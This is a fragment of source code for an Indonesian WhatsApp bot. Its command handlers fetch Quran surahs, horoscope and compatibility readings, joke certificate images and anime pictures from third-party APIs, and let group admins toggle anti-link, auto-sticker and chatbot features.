//=========================================================== 
case 'al-kausar':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=108&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 108\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/108?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//=========================================================== 
case 'al-kafirun':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=109&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 109\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/109?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//=========================================================== 
case 'an-nashr':

                    anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=110&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 110\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
			        quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

                     buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/110?apikey=${settings.lolkey}`)
                     reply(quran.trim())
                     wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                 break
//=========================================================== 
case 'al-lahab':

  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=111&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 111\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

   buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/111?apikey=${settings.lolkey}`)
   reply(quran.trim())
   wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
   break
//=========================================================== 
case 'al-ikhlas':

  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=112&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 112\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

     buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/112?apikey=${settings.lolkey}`)
     reply(quran.trim())
     wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
     break
//===========================================================  
case 'al-falaq':

                    anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=113&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 113\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/113?apikey=${settings.lolkey}`)
                    reply(quran.trim())
                    wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                   break   
 //===========================================================
 case 'an-nas':

 anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=114&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 114\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

 buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/114?apikey=${settings.lolkey}`)
 reply(quran.trim())
 wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
case 'zodiak':
  if (!isGroup) return reply(mess.only.group)
  if (args.length == 0) return reply(`Example: ${prefix + command} leo`)
  ini_text = args.join(" ")
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/zodiak/${ini_text}?apikey=WannOff`)
  reply(get_result.result)
  break                   
//=========================================================
case 'jodoh':
  if (!isGroup) return reply(mess.only.group)
                 if (args.length == 0) return reply(`Example: ${prefix + command} Tahu & Bacem`)
                 ini_nama = args.join(" ").split("&")
                 nama1 = ini_nama[0].trim()
                 nama2 = ini_nama[1].trim()
                 get_result = await fetchJson(`https://api.lolhuman.xyz/api/jodoh/${nama1}/${nama2}?apikey=${settings.lolkey}`)
                 get_result = get_result.result
                 ini_txt = `Positif : ${get_result.positif}\n`
                 ini_txt += `Negative : ${get_result.negatif}\n`
                 ini_txt += `Deskripsi : ${get_result.deskripsi}`
                 reply(ini_txt)
                 break
//=========================================================
case 'jadian2':
  if (!isGroup) return reply(mess.only.group)
         jds = []
         jdii = groupMembers
         koss = groupMembers
         akuu = jdii[Math.floor(Math.random() * jdii.length)]
         diaa = koss[Math.floor(Math.random() * koss.length)]
         teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
         jds.push(akuu.jid)
         jds.push(diaa.jid)
         mentions(teks, jds, true)
         break
//================================================================
  case 'jadian':
         if (!isGroup) return reply(mess.only.group)
                      if (args.length == 0) return reply(`Example: ${prefix + command} 12 12 2020`)
                      tanggal = args[0]
                      bulan = args[1]
                      tahun = args[2]
                      get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadian/${tanggal}/${bulan}/${tahun}?apikey=${settings.lolkey}`)
                      get_result = get_result.result
                      ini_txt = `Karakteristik : ${get_result.karakteristik}\n`
                      ini_txt += `Deskripsi : ${get_result.deskripsi}`
                      reply(ini_txt)
                      break    
//======================================================                     
case 'weton':
  if (!isGroup) return reply(mess.only.group)
               if (args.length == 0) return reply(`Example: ${prefix + command} 12 12 2020`)
               tanggal = args[0]
               bulan = args[1]
               tahun = args[2]
               get_result = await fetchJson(`http://api.lolhuman.xyz/api/weton/${tanggal}/${bulan}/${tahun}?apikey=${settings.lolkey}`)
               get_result = get_result.result
               ini_txt = `Weton : ${get_result.weton}\n`
               ini_txt += `Pekerjaan : ${get_result.pekerjaan}\n`
               ini_txt += `Rejeki : ${get_result.rejeki}\n`
               ini_txt += `Jodoh : ${get_result.jodoh}`
               reply(ini_txt)
               break
case 'fuckboyserti':
                //[❗] Fix Eror By wann.
				
				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}`)
				
				addit = args.join(' ')
				aditty = await getBuffer(`https://api.lolhuman.xyz/api/fuckboy?apikey=${LolApi}&name=${addit}`)
				wann.sendMessage(from, aditty, image, {quoted: floc})
				
				break
				case 'fuckgirlserti':
                //[❗] Fix Eror By wann.
				
				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}`)
				
				addit = args.join(' ')
				aditty = await getBuffer(`https://api.lolhuman.xyz/api/fuckgirl?apikey=${LolApi}&name=${addit}`)
				wann.sendMessage(from, aditty, image, {quoted: floc})
				
				break
				case 'bucinserti':
                //[❗] Fix Eror By wann.
				
				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}`)
				
				addit = args.join(' ')
				aditty = await getBuffer(`https://api.lolhuman.xyz/api/bucinserti?apikey=${LolApi}&name=${addit}`)
				wann.sendMessage(from, aditty, image, {quoted: floc})
				
				break
				case 'pacarserti':
                //[❗] Fix Eror wann.
				
				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}|Aditya`)
				
				ct = args.join(' ')
				dap1 = ct.split('|')[0]
				dap2 = ct.split('|')[1]
				aditty = await getBuffer(`https://api.lolhuman.xyz/api/pacarserti?apikey=${LolApi}&name1=${dap1}&name2=${dap2}`)
				wann.sendMessage(from, aditty, image, {quoted: floc})
				
				break
				case 'goodboyserti':
                //[❗] Fix Eror By wann.
				
				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}`)
				
				addit = args.join(' ')
				aditty = await getBuffer(`https://api.lolhuman.xyz/api/goodboy?apikey=${LolApi}&name=${addit}`)
				wann.sendMessage(from, aditty, image, {quoted: floc})
				
				break
				case 'goodgirlserti':
                //[❗] Fix Eror By wann.
				
				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}`)
				
				addit = args.join(' ')
				aditty = await getBuffer(`https://api.lolhuman.xyz/api/goodgirl?apikey=${LolApi}&name=${addit}`)
				wann.sendMessage(from, aditty, image, {quoted: floc})
				
				break
				case 'badboyserti':
                //[❗] Fix Eror By wann.
				
				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}`)
				
				addit = args.join(' ')
				aditty = await getBuffer(`https://api.lolhuman.xyz/api/badboy?apikey=${LolApi}&name=${addit}`)
wann.sendMessage(from, aditty, image, {quoted: floc})
				
				break
				case 'badgirlserti':
                //[❗] Fix Eror By Wan.
				
				if (args.length < 1) return reply(`text mana broh?\ncontoh ${prefix + command} ${pushname}`)
				
				addit = args.join(' ')
				aditty = await getBuffer(`https://api.lolhuman.xyz/api/badgirl?apikey=${LolApi}&name=${addit}`)
			wann.sendMessage(from, aditty, image, {quoted: floc})
				
				break
				case 'leave':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
  if (!isGroup) return reply(mess.only.group)
 setTimeout( () => {
wann.groupLeave(from) 
 }, 7000)
        setTimeout( () => {
        wann.sendMessage(from, '_1 Detik lagi..._', text, {quoted: fkontak})
        }, 6000)
        setTimeout( () => {
        wann.sendMessage(from, '_2 Detik lagi..._', text, {quoted: fkontak})
        }, 5000)
        setTimeout( () => {
        wann.sendMessage(from, '_3 Detik lagi..._', text, {quoted: fkontak})
        }, 2500)
        setTimeout( () => {    
 reply('Byee...')
  }, 0)
  break
case 'antilinkyt':
   //by @arifirazzaq2001
   //fix By ItsukaAllan
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins) return reply(mess.only.admin)
                                      if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
                                      if (Number(args[0]) === 1) {
                                             if (isAntiLinkytv) return reply('anti link YouTube video sudah aktif')
                                             antilinkytv.push(from)
                                             fs.writeFileSync('./database/group/antilinkyt.json', JSON.stringify(antilinkytv))
                                             reply('Sukses mengaktifkan anti link YouTube di group ini ✔️')
                                             wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link YouTube Video`, text)
                                      } else if (Number(args[0]) === 0) {
                                             if (isAntiLinkytv) return reply('Mode anti link YouTube video sudah Mati')
                                             antilinkytv.splice(from, 1)
                                             fs.writeFileSync('./database/group/antilinkyt.json', JSON.stringify(antilinkytv))
                                             reply('Sukes menonaktifkan anti link YouTube video di group ini ✔️')
                                      } else {
                                             reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
                                      }
                                      break    
//==================================================================================
case 'antilinkyoutube':
   //by @arifirazzaq2001
   //fix By ItsukaAllan
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins) return reply(mess.only.admin)
                                      if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
                                      if (Number(args[0]) === 1) {
                                             if (isAntiLinkytc) return reply('anti link YouTube channel sudah aktif')
                                             antilinkytc.push(from)
                                             fs.writeFileSync('./database/group/antilinkytchannel.json', JSON.stringify(antilinkytc))
                                             reply('Sukses mengaktifkan anti link YouTube channel di group ini ✔️')
                                             wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link YouTube Channel`, text)
                                      } else if (Number(args[0]) === 0) {
                                             if (isAntiLinkytc) return reply('Mode anti link YouTube channel sudah Mati')
                                             antilinkytc.splice(from, 1)
                                             fs.writeFileSync('./database/group/antilinkytchannel.json', JSON.stringify(antilinkytc))
                                             reply('Sukes menonaktifkan anti link YouuTube channel di group ini ✔️')
                                      } else {
                                             reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
                                      }
                                      break
//==================================================================================
case 'antilinkinstagram':
   //by @arifirazzaq2001
   //fix By ItsukaAllan
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins) return reply(mess.only.admin)
                                      if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
                                      if (Number(args[0]) === 1) {
                                             if (isAntiLinkig) return reply('UDAH NYALA KAK')
                                             antilinkig.push(from)
                                             fs.writeFileSync('./database/group/antilinkig.json', JSON.stringify(antilinkig))
                                             reply('SUKSES MENGAKTIFKAN ANTI LINK INSTAGRAM')
                                             wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link IG`, text)
                                      } else if (Number(args[0]) === 0) {
                                             if (!isAntiLinkig) return reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
                                             antilinkig.splice(from, 1)
                                             fs.writeFileSync('./database/group/antilinkig.json', JSON.stringify(antilinkig))
                                             reply('SUKSES MEMATIKAN ANTI LINK IG DI GROUP')
                                      } else {
                                             reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
                                      }
                                      break
//==================================================================================
case 'antilinktelegram':
  //by @arifirazzaq2001
  //fix By ItsukaAllan
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins) return reply(mess.only.admin)
                                     if (args.length < 1) return reply('ketik enable untuk mengaktifkan')
                                     if (args[0] === '1') {
                                     if (isAntiLinkTelegram) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
                                            antitelegram.push(from)
                                            fs.writeFileSync('./database/group/antilinktelegram.json', JSON.stringify(antitelegram))
                                            reply('「 *TELEGRAM DETECTOR* 」 PERINTAH DITERIMA, ANTI LINK TELEGRAM SUDAH ENABLE!')
                                            wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link Telegram! Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
                                     } else if (args[0] === '0') {
                                            antitelegram.splice(from, 1)
                                            fs.writeFileSync('./database/group/antilinktelegram.json', JSON.stringify(antitelegram))
                                            reply('「 *TELEGRAM DETECTOR* 」 PERINTAH DI TERIMA, ANTI LINK TELEGRAM SUDAH DISABLE!')
                                     } else {
                                            reply('enable untuk mengaktifkan, disable untuk menonaktifkan')
                                     }
                                     break
//==================================================================================
case 'antilinkfacebook':
   //by @arifirazzaq2001
   //fix By ItsukaAllan
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins) return reply(mess.only.admin)
                                      if (args.length < 1) return reply('ketik enable untuk mengaktifkan')
                                      if (args[0] === '1') {
                                      if (isAntiLinkfb) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
                                      antilinkfb.push(from)
                                             fs.writeFileSync('./database/group/antilinkfb.json', JSON.stringify(antilinkfb))
                                             reply('「 *Facebook DETECTOR* 」 PERINTAH DITERIMA, ANTI LINK Facebook SUDAH ENABLE!')
                                             wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link Telegram! Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
                                      } else if (args[0] === '0') {
                                             antilinkfb.splice(from, 1)
                                             fs.writeFileSync('./database/group/antilinkfb.json', JSON.stringify(antilinkfb))
                                             reply('「 *Facebook DETECTOR* 」 PERINTAH DI TERIMA, ANTI LINK Facebook SUDAH DISABLE!')
                                      } else {
                                             reply('enable untuk mengaktifkan, disable untuk menonaktifkan')
                                      }
                                      break
                                      
   case 'antilinkmediafire':
   //by @arifirazzaq2001
   //fix By ItsukaAllan
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins) return reply(mess.only.admin)
                                      if (args.length < 1) return reply('ketik enable untuk mengaktifkan')
                                      if (args[0] === '1') {
                                      if (isAntiLinkmediafire) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
                                      antilinkmediafire.push(from)
                                             fs.writeFileSync('./database/group/antilinkmediafire.json', JSON.stringify(antilinkmediafire))
                                             reply('「 *Media Fire DETECTOR* 」 PERINTAH DITERIMA, ANTI LINK MEDIAFIRE SUDAH ENABLE!')
                                             wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim link MediaFire! Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
                                      } else if (args[0] === '0') {
                                             antilinkmediafire.splice(from, 1)
                                             fs.writeFileSync('./database/group/antilinkmediafire.json', JSON.stringify(antilinkmediafire))
                                             reply('「 *Facebook DETECTOR* 」 PERINTAH DI TERIMA, ANTI LINK MEDIA FIRE SUDAH DISABLE!')
                                      } else {
                                             reply('enable untuk mengaktifkan, disable untuk menonaktifkan')
                                      }
                                      break
     case 'simi':
            if (!isGroup) return reply(mess.only.group) 
              if (args[0] === 'enable'){
              if (isSimi) return reply(`Udah aktif`)
              samih.push(from)
              fs.writeFileSync('./database/simi.json', JSON.stringify(samih))
              reply('SIMI DI AKTIFKAN')
              } else if (args[0] === 'disable'){
              let anu = samih.indexOf(from)
              samih.splice(anu, 1)
              fs.writeFileSync('./database/simi.json', JSON.stringify(samih))
              reply('SIMI DI NONAKTIFKAN')
              } else if (!q) {
              	var ini_gopayy =`Halo @${senderr.split('@')[0]} klik button atau Gunakan ${prefix + command } enable / disable jika button tidak merespon`
var buttonss = [
{buttonId: `!simi enable`, buttonText:{displayText: 'ENABLE'}, type: 1},
{buttonId: `!simi disable`, buttonText:{displayText: 'DISABLE'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `© 𝓒𝓻𝓮𝓪𝓽𝓮𝓭 𝓑𝔂 𝓦𝓪𝓷𝓷` ,
buttons: buttonss,
headerType: 1
}
wann.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: '[ • INVIBOT • ]',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: finv,sendEphemeral: true 
			})
			}
          break
case 'autosticker':
                 if (!isGroup) return reply(mess.only.group)
					if (arg.length < 1) return reply('Pilih on atau off!')
					if (args[0] == 'on') {
						if (isAutoSticker) return reply('Udah lu nyalain pantek:v')
						autostick.push(from)
						fs.writeFileSync('./database/autosticker.json', JSON.stringify(autostick))
						reply('Success Enable Auto sticker!')
					} else if (args[0] == 'off') {
						autostick.splice(from, 1)
						fs.writeFileSync('./database/autosticker.json', JSON.stringify(autostick))
						reply('Success Disable Auto sticker!')
					} else {
						reply(`𝗸𝗲𝘁𝗶𝗸 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 on 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻, off 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻\n𝗰𝗼𝗻𝘁𝗼𝗵: ${prefix}${command} on`)
					}
					break
case 'fuutarou': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=fuutarou`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Fuutarou', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//==============================================================================================
case 'itsuki': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=itsuki`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Fuutarou', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//==============================================================================================
case 'itsuki': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=itsuki`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Itsuki', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//==============================================================================================
case 'nino': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=nino`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Nino', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'yotsuba': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=yotsuba`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Yotsuba', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'naruto': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=naruto`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Naruto', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'mikasa': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=mikasa`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Mikasa', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'eren': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=eren`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Eren', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'titan': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=titan`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Titan', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'levi': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=levi`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Levi', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'sakura': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=sakura`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sakura', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'hinata': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=hinata`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Hinata', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'neji': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=neji`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Neji', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'minato': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=minato`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Minato', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//=============================================
case 'jiraya': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=jiraya`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Jiraya', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break  
//============================================= 
case 'tsunade': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=tsunade`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Tsunade', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'kiba': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=kiba`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Kiba', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'armin': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=armin`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
